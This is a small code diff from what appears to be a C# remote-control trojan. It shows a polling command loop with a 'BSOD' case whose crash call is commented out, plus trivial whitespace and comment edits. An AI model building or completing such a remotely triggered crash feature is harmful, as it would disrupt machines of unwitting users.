@@ -58,7 +58,6 @@ namespace GloryHole
                                     break;
                                 case (CommandTypes.BSOD):/*Бдос вызвать нада */
                                     //BSOD();
-                                    
                                     break;
                             }
                         }
@@ -71,7 +70,7 @@ namespace GloryHole
                     }
                 Thread.Sleep(500);
             }
-        }
+        }//sda
 
 
         public static void helloVania()
